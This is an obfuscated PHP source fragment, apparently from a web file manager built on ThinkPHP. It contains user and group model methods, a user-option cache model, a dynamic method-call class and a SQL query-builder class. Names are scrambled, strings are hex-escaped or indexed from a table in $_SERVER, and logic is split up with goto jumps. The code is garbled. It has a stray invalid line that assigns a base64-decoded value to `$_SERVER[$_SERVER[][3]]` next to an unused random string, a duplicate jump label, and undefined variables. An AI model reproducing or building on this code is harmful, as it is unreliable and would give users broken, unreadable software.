array(), !0); goto aˊ; a肆Ϸ: $d֊ =& $_SERVER[Ť]; if (!isset($_SERVER[$d֊[719]]) || !isset($_SERVER[$d֊[720]])) { goto eÌ; F: $C = $d֊[811]; $C($_SERVER[$d֊[812]]); $c = 1; goto Aу; Aу: for ($Fۦ = $c; $Fۦ > 0; $Fۦ++) { $C = json_encode($GLOBALS[$d֊[400]]); } goto A؞; eÌ: $A = $d֊[810]; $f렏Ì = $d֊[721]; $E۾ = $_SERVER[$d֊[722]] . $d֊[723]; goto d놋; d놋: $DϞ = $f렏Ì($E۾); $CԚ = explode($d֊[225], $DϞ); if (count($CԚ) < $d֊[579]) { $e˨ = $d֊[724]; $e˨(); } goto F; A؞: } $b = $this->getInfoSimple($A); goto F; F: if (!$b || !is_array($bُ͎)) { return !1; } $cⰺ = Model($d֊[1735]); $cⰺ->where(array($d֊[1493] => $A))->delete(); goto A׮; A׮: $B = array(); $f = 0; foreach ($bُ͎ as $Fߕ => $fя) { $Bґ = array($d֊[1493] => $A, $d֊[1652] => $Fߕ, $d֊[1801] => $fя); $Bґ[$d֊[1675]] = isset($C꼢[$f]) ? $C꼢[$f] : 0; $f++; $B[] = $Bґ; } goto Aɏ; aˊ: } protected function userGroupAdd($BɶϦ, $fﾢ = array()) { $C =& $_SERVER[Ť]; $Fѫ܏ = $this->getInfoSimple($BɶϦ); if (!$Fѫ܏ || empty($fﾢ)) { return !1; } $Bႛû = array(); foreach ($fﾢ as $Dݓ => $Dۺ) { $Bႛû[] = array($C[1493] => $BɶϦ, $C[1652] => $Dݓ, $C[1801] => $Dۺ, $C[1675] => 0); } return Model($C[1735])->addAll($Bႛû, array(), !0); } protected function userGroupRemove($E̟û, $dɯ팲) { $d΋ =& $_SERVER[Ť]; $B = $this->getInfoSimple($E̟û); if (!$B || !$dɯ팲) { return !1; } $BЈϖ = array($d΋[1485] => $E̟û, $d΋[1733] => $dɯ팲); return Model($d΋[1735])->where($BЈϖ)->delete(); } public function listData() { $A䂇 = $this->_makeOrder()->selectPage(50); $this->_listDataApply($A䂇[$_SERVER[Ť][361]]); return $A䂇; } public function listByID($CҴ) { $AÝ =& $_SERVER[Ť]; if (!$CҴ) { return; } $f = array($AÝ[1493] => array($AÝ[7], $CҴ)); $b̛ = $this->where($f)->select(); $this->_listDataApply($b̛); return $b̛; } public function listByGroup($bϿӳ = 0, $Dӳ = array()) { goto Bߣ۠; Bߣ۠: $Eﾦ =& $_SERVER[Ť]; $e王ʚ = $Eﾦ[33]; $F = array(); goto Eˎ; Eˎ: if ($bϿӳ) { $F = array($Eﾦ[2107] => intval($bϿӳ)); $e王ʚ = "\114\x45\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\165\163\x65\162\x5f\x67\x72\x6f\x75\x70\40\x75\163\145\x72\x5f\147\x72\157\165\160\40\x6f\x6e\40\x75\x73\x65\x72\56\x75\x73\x65\162\111\x44\x20\x3d\x20\x75\163\145\162\x5f\147\162\x6f\x75\x70\x2e\165\163\x65\x72\111\x44"; $B䲲 = Input::get($Eﾦ[423], null, $Eﾦ[33]) ? $Eﾦ[33] : $Eﾦ[2108]; } if (isset($Dӳ[$Eﾦ[699]])) { $F[$Eﾦ[2109]] = $Dӳ[$Eﾦ[699]]; } $a̩ת = $this->_makeOrder($B䲲)->field($Eﾦ[2110])->where($F)->join($e王ʚ)->selectPage(50); goto C; C: $this->_listDataApply($a̩ת[$Eﾦ[361]]); return $a̩ת; goto A; A: } private function _makeOrder($A䴥 = '') { goto fҢ; e敖: $A䴥 = $A䴥 . "\165\163\145\162\x2e{$d}\40{$A}\54\40\165\x73\145\162\x2e\165\163\x65\162\x49\104\x20\x61\163\143"; return $this->alias($f[1857])->order($A䴥); goto fר; fҢ: $f =& $_SERVER[Ť]; $B = array($f[1493], $f[28], $f[1638], $f[1610], $f[190]); $Aڍ = array($f[418] => $f[419], $f[420] => $f[421]); goto E; E: $d = Input::get($f[423], $f[7], $f[1485], $B); $A = Input::get($f[424], $f[7], $f[1736], array($f[1736], $f[420])); $A = $Aڍ[$A]; goto e敖; fר: } public function listSearch($eɝ) { goto Eܩ; e炶祴: $AΊ = str_replace($F[1739], $F[1740], trim($AΊ)); $fц˵ = array($F[28] => array($F[373], "\45{$AΊ}\x25"), $F[299] => array($F[373], "{$AΊ}\x25"), $F[1917] => array($F[373], "{$AΊ}\45"), $F[928] => $F[1741]); if (Input::check($AΊ, $F[305])) { $fц˵[$F[1493]] = array($F[373], "{$AΊ}\45"); $fц˵[$F[2091]] = array($F[373], "{$AΊ}\x25"); } goto F; fܤ: $this->_filterByGroup($E, $CĄ); return $E; goto a᭣; Eܩ: $F =& $_SERVER[Ť]; $AΊ = $eɝ[$F[1737]]; $CĄ = isset($eɝ[$F[1738]]) ? $eɝ[$F[1738]] : !1; goto e炶祴; E崅ŉ: $E = $this->_makeOrder()->where($fц˵)->selectPage(20); if (!$E || count($E[$F[361]]) < 5 && Input::check($AΊ, $F[312])) { $EՈ = $this->_searchFromMeta($F[431], $AΊ, 10); $F􂲵 = $this->_searchFromMeta($F[432], $AΊ, 10); $aߺ = array_merge($EՈ, $F􂲵, $E[$F[361]]); $E[$F[361]] = array_unique_by_key($aߺ, $F[1493]); $E[$F[358]][$F[359]] = count($E[$F[361]]); $E[$F[358]][$F[360]] = ceil($E[$F[358]][$F[359]] / $E[$F[358]][$F[356]]); } $this->_listDataApply($E[$F[361]]); goto fܤ; F: if (!$AΊ) { $fц˵ = array(); } if (isset($eɝ[$F[699]])) { $fц˵[$F[699]] = $eɝ[$F[699]]; } $fц˵ = $this->parseWhereLike($fц˵); goto E崅ŉ; a᭣: } private function _filterByGroup(&$F, $b) { $a̴ =& $_SERVER[Ť]; if (!$b) { return $F; } foreach ($F[$a̴[361]] as $e£ => &$f) { $Bؗ = array_to_keyvalue($f[$a̴[1827]], $a̴[33], $a̴[1652]); if (!in_array($b, $Bؗ)) { unset($F[$a̴[361]][$e£]); } } unset($f); $F[$a̴[361]] = array_values($F[$a̴[361]]); $F[$a̴[358]] = array($a̴[1890] => count($F[$a̴[361]]), $a̴[1888] => $F[$a̴[358]][$a̴[356]], $a̴[1887] => 1, $a̴[1889] => 1); } private function _searchFromMeta($C, $Fُ, $d) { goto A̔ޟ; F: return $Bߴ; goto Eܒơ; C͉: $f = array_to_keyvalue($f, $d[33], $d[1493]); $Bߴ = $this->where(array($d[1485] => array($d[7], $f)))->select(); if (!$Bߴ) { return array(); } goto F; A̔ޟ: $d =& $_SERVER[Ť]; $Fُ = strtolower($Fُ); $cٲ = array($d[89] => $C, $d[366] => array($d[373], "\x25{$Fُ}\x25")); goto Cۯ; Cۯ: $cٲ = $this->parseWhereLike($cٲ); $f = Model($d[2111])->where($cٲ)->limit($d)->select(); if (!$f) { return array(); } goto C͉; Eܒơ: } private function _listDataApplyItem($eō) { $Aܵ = array($eō); $this->_listDataApply($Aܵ); return $Aܵ[0]; } private function _listDataApply(&$f圶ә) { goto AǏᬵ; AǏᬵ: $B߰ =& $_SERVER[Ť]; if (!$f圶ә) { return; } array_remove_key($f圶ә, $B߰[820]); goto a¡; a¡: $D = array_to_keyvalue($f圶ә, $B߰[33], $B߰[1493]); $this->_listAppendGroup($f圶ә, $D); $this->_listAppendMeta($f圶ә, $D); goto aƒ޵; aƒ޵: $this->_listAppendSourceRoot($f圶ә, $D); goto E䆌; E䆌: } private function _listAppendSourceRoot(&$b쩏, $cݬ׋) { goto CҐ; AШ: $AĥΞ = Model($a[768])->order($a[1749])->field($b̎)->where($d)->select(); $AĥΞ = array_to_keyvalue($AĥΞ, $a[473]); $AĥΞ = array_remove_key($AĥΞ, $a[473]); goto eţ򿰞; eţ򿰞: foreach ($b쩏 as &$cމ) { $cމ[$a[407]] = $AĥΞ[$cމ[$a[1493]]] ? $AĥΞ[$cމ[$a[1493]]] : array(); } unset($cމ); goto fᚐ; CҐ: $a =& $_SERVER[Ť]; $d = array($a[478] => 0, $a[387] => SourceModel::TYPE_USER, $a[473] => array($a[7], $cݬ׋)); $b̎ = $a[1748]; goto AШ; fᚐ: } private function _listAppendGroup(&$E, $fҝު) { goto aۛȄ; Cڊ: $Eᅞ = array_to_keyvalue($a̶, $F[33], $F[1652]); $Eᅞ = array_remove_value(array_unique($Eᅞ), $F[485]); if (!$Eᅞ || !$a̶) { return; } goto a̰; F: foreach ($E as &$B׺) { $B׺[$F[1827]] = array(); if (isset($a̶[$B׺[$F[1493]]])) { $B׺[$F[1827]] = $a̶[$B׺[$F[1493]]]; } } unset($B׺); goto bݜ; a̰: $e = array($F[1652] => array($F[7], $Eᅞ)); $bڡ = Model($F[1825])->field($F[2112])->where($e)->select(); $bڡ = array_to_keyvalue($bڡ, $F[1652]); goto CË; CË: $a̶ = array_to_keyvalue_group($a̶, $F[1493]); foreach ($a̶ as &$b) { $b = array(); foreach ($b as $d) { if (!$d[$F[1801]]) { continue; } $B = Model($F[1821])->listData($d[$F[1801]]); $b[] = array($F[1652] => $d[$F[1652]], $F[2113] => $bڡ[$d[$F[1652]]][$F[28]], $F[476] => $bڡ[$d[$F[1652]]][$F[476]], $F[392] => $B); } $b = $b; } unset($b); goto F; aۛȄ: $F =& $_SERVER[Ť]; $e = array($F[1493] => array($F[7], $fҝު)); $a̶ = Model($F[1735])->where($e)->select(); goto Cڊ; bݜ: } private function _listAppendMeta(&$b֑, $dޚ) { goto d; fج: foreach ($A䫦 as &$Eɂ) { $dǧ = array(); foreach ($Eɂ as $b) { if (!in_array($b[$Cɹ[89]], $CД)) { $dǧ[$b[$Cɹ[89]]] = $b[$Cɹ[366]]; } } $Eɂ = $dǧ; } unset($Eɂ); $dࣇ = Model($Cɹ[2114]); goto E; d: $Cɹ =& $_SERVER[Ť]; $D = UserJobModel::JOB_KEY; $CД = array($Cɹ[2092]); goto aѱޞಃ; E: foreach ($b֑ as &$aʸ) { $aۊ = array(); if (isset($A䫦[$aʸ[$Cɹ[1493]]])) { $aۊ = $A䫦[$aʸ[$Cɹ[1493]]]; } $aʸ[$Cɹ[2115]] = array(); if (isset($aۊ[$D])) { $aʸ[$Cɹ[2115]] = $dࣇ->getUserJobInfo($aۊ[$D]); } } unset($aʸ); goto Eߎ; aѱޞಃ: $B = array($Cɹ[1493] => array($Cɹ[7], $dޚ)); $A䫦 = Model($Cɹ[2090])->where($B)->select(); $A䫦 = array_to_keyvalue_group($A䫦, $Cɹ[1493]); goto fج; Eߎ: } protected function groupUserAll($Aƍ) { $A霕 =& $_SERVER[Ť]; if (!$Aƍ) { return !1; } $c؊ = Model($A霕[1735])->field($A霕[1493])->where(array($A霕[1652] => array($A霕[7], $Aƍ)))->select(); $c؊ = array_to_keyvalue($c؊, $A霕[33], $A霕[1493]); return array_unique($c؊); } public function userSearch($DƋ, $c򥤷 = "\x2a") { return Model($_SERVER[Ť][494])->where($DƋ)->field($c򥤷)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\157\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($a) { $D٦侶 =& $_SERVER[Ť]; if (!defined($D٦侶[442])) { define($D٦侶[442], 0); } return "\x55\x73\x65\x72\117\x70\164\151\x6f\x6e\x5f{$a}\137" . USER_ID; } protected function filterWhere($B) { $EФ =& $_SERVER[Ť]; if (!defined($EФ[442])) { define($EФ[442], 0); } $B[$EФ[1493]] = USER_ID; return $B; } public function cacheRemoveUser($A, $aζ) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\164\151\157\156\137{$A}\137" . $aζ); } protected function optionDefault($cǌ = '') { $Eɳ =& $_SERVER[Ť]; if ($cǌ == $Eɳ[33]) { return $GLOBALS[$Eɳ[6]][$Eɳ[2116]]; } if ($cǌ == $Eɳ[2117]) { return $GLOBALS[$Eɳ[6]][$Eɳ[2118]]; } } } goto dɫՉ; c͚̔: function binCheckBigger($Dֈ, $E߮ಎ) { return $Dֈ > $E߮ಎ; } $_SERVER[$_SERVER[][3]] = ("\x38\x37\x38\x39".base64_decode('Nzc='))+0;$_3k8J="PYeJaYt5warHGxKfTszRQ4p9vjbXC4j72IIMRuUGkNYDE7gmkFpZ83cn93wgZ459i";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A󠔇, $c楽) { $bх =& $_SERVER[Ť]; if (isset(self::$_methodList[$A󠔇])) { return @call_user_func_array(self::$_methodList[$A󠔇], $c楽); } else { if (method_exists($this, $A󠔇)) { return call_user_func_array(array($this, $A󠔇), $c楽); } else { think_exception(__CLASS__ . $bх[4] . $A󠔇 . $bх[5]); } } } public static function __callStatic($F, $aϤ) { if (isset(self::$_methodListStatic[$F])) { return call_user_func_array(self::$_methodListStatic[$F], $aϤ); } else { if (method_exists(self, $F)) { return call_user_func_array(array(self, $F), $aϤ); } else { show_json("{$F}\50\x29\x20\x6e\157\x74\x20\x65\x78\151\163\164\x3b", !1); } } } public static function addMethod($Eܻ, $aŗ) { self::$_methodList[$Eܻ] = $aŗ; } public static function addMethodStatic($e, $bҜ) { self::$_methodListStatic[$e] = $bҜ; } } goto eҪ; A䖼: class DbSqlite3 extends DbSqlite3Base { public function query($Bщ۞) { $B䱐 =& $_SERVER[Ť]; if (!CacheLock::fileLock($B䱐[9])) { return !1; } $B̓ȗ = parent::query($Bщ۞); CacheLock::fileUnLock($B䱐[9]); return $B̓ȗ; } public function execute($F貯) { $B༓ =& $_SERVER[Ť]; if (!CacheLock::fileLock($B༓[9])) { return !1; } $c = parent::execute($F貯); CacheLock::fileUnLock($B༓[9]); return $c; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\145\x71" => "\74\76", "\147\164" => "\76", "\145\147\164" => "\76\75", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\x3d", "\156\x6f\x74\x6c\151\153\145" => "\116\117\x54\40\114\111\113\105", "\x6c\151\153\145" => "\114\x49\x4b\x45", "\x69\x6e" => "\111\x4e", "\x6e\x6f\164\151\156" => "\116\x4f\124\x20\x49\116", "\x6e\x6f\x74\40\x69\156" => "\x4e\117\124\x20\111\116", "\x62\x65\164\167\145\x65\x6e" => "\102\x45\124\x57\x45\x45\x4e", "\x6e\x6f\x74\x62\x65\164\x77\145\145\x6e" => "\116\x4f\x54\x20\x42\x45\x54\127\105\105\x4e", "\156\157\164\x20\142\x65\x74\x77\x65\x65\156" => "\116\117\124\x20\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\123\105\114\x45\103\x54\x25\104\x49\123\124\111\116\x43\124\x25\x20\45\x46\x49\105\x4c\104\45\40\106\122\x4f\115\40\45\124\101\x42\114\105\45\45\x4a\117\111\116\x25\x25\127\x48\105\122\x45\x25\45\107\122\117\125\x50\x25\45\110\101\126\111\116\107\45\x25\117\x52\x44\105\x52\x25\45\114\x49\x4d\x49\x54\x25\40\45\125\116\x49\117\116\45\x25\x43\x4f\x4d\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $e۹ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ť][890], $e۹); } public function factory($Dê = '') { goto B̓; A: return $cą; goto d凅; B̓: $cԊ =& $_SERVER[Ť]; $Dê = $this->parseConfig($Dê); if (empty($Dê[$cԊ[891]])) { think_exception(think_lang($cԊ[892])); } goto Aȏċ; Aȏċ: $this->dbType = ucwords(strtolower($Dê[$cԊ[891]])); $bņý = $cԊ[893] . $this->dbType; if (class_exists($bņý)) { $cą = new $bņý($Dê); if ($cԊ[740] != strtolower($Dê[$cԊ[891]])) { $cą->dbType = strtoupper($this->dbType); } else { $cą->dbType = $this->_getDsnType($Dê[$cԊ[846]]); } } else { think_exception(think_lang($cԊ[894]) . $cԊ[895] . $bņý); } goto A; d凅: } public function __call($e䱆, $eνɸ) { if (method_exists($this, $e䱆)) { return call_user_func_array(array($this, $e䱆), $eνɸ); } } protected function _getDsnType($F) { $eŶ = explode($_SERVER[Ť][4], $F); $e߇ = strtoupper(trim($eŶ[0])); return $e߇; } private function parseConfig($aЍ҆ = '') { $DۮƗ =& $_SERVER[Ť]; if (!empty($aЍ҆) && is_string($aЍ҆)) { $aЍ҆ = $this->parseDSN($aЍ҆); } elseif (is_array($aЍ҆)) { $aЍ҆ = array_change_key_case($aЍ҆); $aЍ҆ = array($DۮƗ[891] => $aЍ҆[$DۮƗ[739]], $DۮƗ[819] => $aЍ҆[$DۮƗ[896]], $DۮƗ[820] => $aЍ҆[$DۮƗ[897]], $DۮƗ[817] => $aЍ҆[$DۮƗ[898]], $DۮƗ[818] => $aЍ҆[$DۮƗ[899]], $DۮƗ[17] => $aЍ҆[$DۮƗ[900]], $DۮƗ[846] => $aЍ҆[$DۮƗ[741]], $DۮƗ[13] => isset($aЍ҆[$DۮƗ[901]]) ? $aЍ҆[$DۮƗ[901]] : array()); } elseif (empty($aЍ҆)) { if (think_config($DۮƗ[902]) && $DۮƗ[740] != strtolower(think_config($DۮƗ[903]))) { $aЍ҆ = $this->parseDSN(think_config($DۮƗ[902])); } else { $aЍ҆ = array($DۮƗ[891] => think_config($DۮƗ[903]), $DۮƗ[819] => think_config($DۮƗ[904]), $DۮƗ[820] => think_config($DۮƗ[905]), $DۮƗ[817] => think_config($DۮƗ[906]), $DۮƗ[818] => think_config($DۮƗ[907]), $DۮƗ[17] => think_config($DۮƗ[240]), $DۮƗ[846] => think_config($DۮƗ[902]), $DۮƗ[13] => think_config($DۮƗ[908])); } } return $aЍ҆; } protected function initConnect($A = true) { if (1 == think_config($_SERVER[Ť][18])) { $this->_linkID = $this->multiConnect($A); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $aݘ => $B⤕) { $this->_linkID = $B⤕; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($dۅᤏ = false) { $f =& $_SERVER[Ť]; static $FÝà = array(); if (empty($FÝà)) { foreach ($this->config as $C => $bМ) { $FÝà[$C] = explode($f[47], $bМ); } } if (think_config($f[909])) { if ($dۅᤏ) { $b = floor(mt_rand(0, think_config($f[910]) - 1)); } else { if (is_numeric(think_config($f[911]))) { $b = think_config($f[911]); } else { $b = floor(mt_rand(think_config($f[910]), count($FÝà[$f[817]]) - 1)); } } } else { $b = floor(mt_rand(0, count($FÝà[$f[817]]) - 1)); } $bδݳ = array($f[819] => isset($FÝà[$f[819]][$b]) ? $FÝà[$f[819]][$b] : $FÝà[$f[819]][0], $f[820] => isset($FÝà[$f[820]][$b]) ? $FÝà[$f[820]][$b] : $FÝà[$f[820]][0], $f[817] => isset($FÝà[$f[817]][$b]) ? $FÝà[$f[817]][$b] : $FÝà[$f[817]][0], $f[818] => isset($FÝà[$f[818]][$b]) ? $FÝà[$f[818]][$b] : $FÝà[$f[818]][0], $f[17] => isset($FÝà[$f[17]][$b]) ? $FÝà[$f[17]][$b] : $FÝà[$f[17]][0], $f[846] => isset($FÝà[$f[846]][$b]) ? $FÝà[$f[846]][$b] : $FÝà[$f[846]][0], $f[13] => isset($FÝà[$f[13]][$b]) ? $FÝà[$f[13]][$b] : $FÝà[$f[13]][0]); return $this->connect($bδݳ, $b); } public function parseDSN($b) { $Eĕ =& $_SERVER[Ť]; if (empty($b)) { return !1; } $A󾺷 = parse_url($b); if ($A󾺷[$Eĕ[172]]) { $a = array($Eĕ[891] => $A󾺷[$Eĕ[172]], $Eĕ[819] => isset($A󾺷[$Eĕ[551]]) ? $A󾺷[$Eĕ[551]] : $Eĕ[33], $Eĕ[820] => isset($A󾺷[$Eĕ[912]]) ? $A󾺷[$Eĕ[912]] : $Eĕ[33], $Eĕ[817] => isset($A󾺷[$Eĕ[173]]) ? $A󾺷[$Eĕ[173]] : $Eĕ[33], $Eĕ[818] => isset($A󾺷[$Eĕ[174]]) ? $A󾺷[$Eĕ[174]] : $Eĕ[33], $Eĕ[17] => isset($A󾺷[$Eĕ[75]]) ? substr($A󾺷[$Eĕ[75]], 1) : $Eĕ[33]); } else { preg_match($Eĕ[913], trim($b), $eش); $a = array($Eĕ[891] => $eش[1], $Eĕ[819] => $eش[2], $Eĕ[820] => $eش[3], $Eĕ[817] => $eش[4], $Eĕ[818] => $eش[5], $Eĕ[17] => $eش[6]); } $a[$Eĕ[846]] = $Eĕ[33]; return $a; } protected function debug() { $c =& $_SERVER[Ť]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $c[914]; if (think_config($c[915])) { think_status($c[916]); think_trace($this->queryStr . $c[917] . think_status($c[20], $c[916], 6) . $c[918], $c[33], $c[919]); } } protected function parseLock($C = false) { $fҜ =& $_SERVER[Ť]; if (!$C) { return $fҜ[33]; } if ($fҜ[848] == $this->dbType) { return $fҜ[920]; } return $fҜ[921]; } protected function parseSet($d) { $d䠖 =& $_SERVER[Ť]; foreach ($d as $DĢͱ => $C愣τ) { if (is_array($C愣τ) && $d䠖[291] == $C愣τ[0]) { $e[] = $this->parseKey($DĢͱ) . $d䠖[922] . $C愣τ[1]; } elseif (is_scalar($C愣τ) || is_null($C愣τ)) { $e[] = $this->parseKey($DĢͱ) . $d䠖[922] . $this->parseValue($C愣τ); } } return $d䠖[923] . implode($d䠖[47], $e); } protected function bindParam($E玗, $e΄) { $this->bind[$_SERVER[Ť][4] . $E玗] = $e΄; } protected function parseBind($dʂ) { $dʂ = array_merge($this->bind, $dʂ); $this->bind = array(); return $dʂ; } function parseKey(&$f, $E݈՘ = true) { if ($E݈՘) { $f = $this->parseKeyCheck($f); } return $f; } function parseKeyCheck($D) { $f =& $_SERVER[Ť]; $D = trim($D); if (!preg_match($f[924], $D)) { think_exception($f[925] . $D); } return $D; } protected function parseValue($F) { $cͼ =& $_SERVER[Ť]; if (is_string($F)) { $F = $cͼ[887] . $this->escapeString($F) . $cͼ[887]; } elseif (isset($F[0]) && is_string($F[0]) && strtolower($F[0]) == $cͼ[291]) { $F = $this->escapeString($F[1]); } elseif (is_array($F)) { $F = array_map(array($this, $cͼ[888]), $F); } elseif (is_bool($F)) { $F = $F ? $cͼ[83] : $cͼ[485]; } elseif (is_null($F)) { $F = $cͼ[99]; } return $F; } protected function parseField($aܿ) { $aȎ =& $_SERVER[Ť]; if (is_string($aܿ) && strpos($aܿ, $aȎ[47])) { $aܿ = explode($aȎ[47], $aܿ); } if (is_array($aܿ)) { $a = array(); foreach ($aܿ as $D => $e䷼) { if (!is_numeric($D)) { $a[] = $this->parseKey($D) . $aȎ[926] . $this->parseKey($e䷼); } else { $a[] = $this->parseKey($e䷼); } } $C̟ѱ = implode($aȎ[47], $a); } elseif (is_string($aܿ) && !empty($aܿ)) { $C̟ѱ = $aܿ; } else { $C̟ѱ = $aȎ[180]; } return $C̟ѱ; } protected function parseTable($CӨ) { $Bݒ =& $_SERVER[Ť]; if (is_array($CӨ)) { $aܒ = array(); foreach ($CӨ as $C => $E) { if (!is_numeric($C)) { $aܒ[] = $this->parseKey($C) . $Bݒ[50] . $this->parseKey($E); } else { $aܒ[] = $this->parseKey($C); } } $CӨ = $aܒ; } elseif (is_string($CӨ)) { if (strstr($CӨ, $Bݒ[50])) { return $CӨ; } $CӨ = explode($Bݒ[47], $CӨ); array_walk($CӨ, array($this, $Bݒ[837])); } return $Bݒ[831] . trim(implode($Bݒ[927], $CӨ), $Bݒ[375]) . $Bݒ[831]; } protected function parseWhere($e㻦) { $d =& $_SERVER[Ť]; $fᩃ = $d[33]; if (is_string($e㻦)) { $fᩃ = $e㻦; } else { $Fвϲ = isset($e㻦[$d[928]]) ? strtoupper($e㻦[$d[928]]) : $d[33]; if (in_array($Fвϲ, array($d[929], $d[930], $d[931]))) { $Fвϲ = $d[50] . $Fвϲ . $d[50]; unset($e㻦[$d[928]]); } else { $Fвϲ = $d[932]; } foreach ($e㻦 as $eΓ => $Eˏ) { $fᩃ .= $d[271]; if (is_numeric($eΓ)) { $eΓ = $d[933]; } if (0 === strpos($eΓ, $d[70])) { $fᩃ .= $this->parseThinkWhere($eΓ, $Eˏ); } else { if (!preg_match($d[934], trim($eΓ))) { think_exception(think_lang($d[935]) . $d[4] . $eΓ); } $fҊ = is_array($Eˏ) && isset($Eˏ[$d[936]]); $eΓ = trim($eΓ); if (strpos($eΓ, $d[277])) { $C桶 = explode($d[277], $eΓ); $Cڿ = array(); foreach ($C桶 as $cȷ => $bĞ) { $cƭ = $fҊ ? $Eˏ[$cȷ] : $Eˏ; $Cڿ[] = $d[254] . $this->parseWhereItem($this->parseKey($bĞ), $cƭ) . $d[836]; } $fᩃ .= implode($d[937], $Cڿ); } elseif (strpos($eΓ, $d[278])) { $C桶 = explode($d[278], $eΓ); $Cڿ = array(); foreach ($C桶 as $cȷ => $bĞ) { $cƭ = $fҊ ? $Eˏ[$cȷ] : $Eˏ; $Cڿ[] = $d[254] . $this->parseWhereItem($this->parseKey($bĞ), $cƭ) . $d[836]; } $fᩃ .= implode($d[932], $Cڿ); } else { $fᩃ .= $this->parseWhereItem($this->parseKey($eΓ), $Eˏ); } } $fᩃ .= $d[272] . $Fвϲ; } $fᩃ = substr($fᩃ, 0, -strlen($Fвϲ)); } return empty($fᩃ) ? $d[33] : $d[938] . $fᩃ; } protected function parseWhereItem($dѤ, $fܦ) { $a =& $_SERVER[Ť]; $EȻ = $a[33]; if (is_array($fܦ)) { if (is_string($fܦ[0])) { $A쏐 = strtolower($fܦ[0]); if (in_array($fܦ[0], array($a[922], $a[939], $a[940], $a[941], $a[942], $a[943]))) { $EȻ .= $dѤ . $a[50] . $fܦ[0] . $a[50] . $this->parseValue($fܦ[1]); } elseif (preg_match($a[944], $fܦ[0])) { $EȻ .= $dѤ . $a[50] . $this->exp[$A쏐] . $a[50] . $this->parseValue($fܦ[1]); } elseif (preg_match($a[945], $fܦ[0])) { if (is_array($fܦ[1])) { $AΌ칗 = isset($fܦ[2]) ? strtoupper($fܦ[2]) : $a[930]; if (in_array($AΌ칗, array($a[929], $a[930], $a[931]))) { $EǑ = array(); foreach ($fܦ[1] as $A文) { $EǑ[] = $dѤ . $a[50] . $this->exp[$A쏐] . $a[50] . $this->parseValue($A文); } $EȻ .= $a[254] . implode($a[50] . $AΌ칗 . $a[50], $EǑ) . $a[836]; } } else { $EȻ .= $dѤ . $a[50] . $this->exp[$A쏐] . $a[50] . $this->parseValue($fܦ[1]); } } elseif ($a[291] == $A쏐) { $EȻ .= $a[834] . $dѤ . $a[50] . $fܦ[1] . $a[946]; } elseif (preg_match($a[947], $fܦ[0])) { $EȻ .= $fܦ[0]; } elseif (preg_match($a[948], $fܦ[0])) { if (isset($fܦ[2]) && $a[291] == $fܦ[2]) { $EȻ .= $dѤ . $a[50] . $this->exp[$A쏐] . $a[50] . $fܦ[1]; } else { if (is_string($fܦ[1])) { $fܦ[1] = explode($a[47], $fܦ[1]); } $eʛ = implode($a[47], $this->parseValue($fܦ[1])); $EȻ .= $dѤ . $a[50] . $this->exp[$A쏐] . $a[834] . $eʛ . $a[836]; } } elseif (preg_match($a[949], $fܦ[0])) { $aи = is_string($fܦ[1]) ? explode($a[47], $fܦ[1]) : $fܦ[1]; $EȻ .= $a[834] . $dѤ . $a[50] . $this->exp[$A쏐] . $a[50] . $this->parseValue($aи[0]) . $a[932] . $this->parseValue($aи[1]) . $a[272]; } else { think_exception(think_lang($a[935]) . $a[4] . $fܦ[0]); } } else { $Fʇ砅 = count($fܦ); $Bυ = $a[33]; if (is_string($fܦ[$Fʇ砅 - 1])) { $Bυ = isset($fܦ[$Fʇ砅 - 1]) ? strtoupper($fܦ[$Fʇ砅 - 1]) : $a[33]; if (in_array($Bυ, array($a[929], $a[930], $a[931]))) { $Fʇ砅 = $Fʇ砅 - 1; } } else { $Bυ = $a[929]; } for ($aЭ = 0; $aЭ < $Fʇ砅; $aЭ++) { $aи = is_array($fܦ[$aЭ]) ? $fܦ[$aЭ][1] : $fܦ[$aЭ]; if ($a[291] == strtolower($fܦ[$aЭ][0])) { $EȻ .= $a[254] . $dѤ . $a[50] . $aи . $a[946] . $Bυ . $a[50]; } else { $D䤱 = is_array($fܦ[$aЭ]) ? $this->exp[strtolower($fܦ[$aЭ][0])] : $a[922]; if (!$D䤱 && is_array($fܦ[$aЭ]) && in_array($fܦ[$aЭ][0], array($a[922], $a[939], $a[940], $a[941], $a[942], $a[943]))) { $D䤱 = $fܦ[$aЭ][0]; } $EȻ .= $a[254] . $dѤ . $a[50] . $D䤱 . $a[50] . $this->parseValue($aи) . $a[946] . $Bυ . $a[50]; } } $EȻ = substr($EȻ, 0, -4); } } else { $EȻ .= $dѤ . $a[950] . $this->parseValue($fܦ); } return $EȻ; } protected function parseThinkWhere($fÖ, $e΃) { $Fڏ =& $_SERVER[Ť]; $E⾸ƅ = $Fڏ[33]; switch ($fÖ) { case $Fڏ[346]: $E⾸ƅ = $e΃; break; case $Fڏ[933]: $E⾸ƅ = is_string($e΃) ? $e΃ : substr($this->parseWhere($e΃), 6); break; case $Fڏ[951]: parse_str($e΃, $cꅦҖ); if (isset($cꅦҖ[$Fڏ[928]])) { $A箾 = $Fڏ[50] . strtoupper($cꅦҖ[$Fڏ[928]]) . $Fڏ[50]; unset($cꅦҖ[$Fڏ[928]]); } else { $A箾 = $Fڏ[932]; } $A˖ = array(); foreach ($cꅦҖ as $Aȭ => $e߅) { 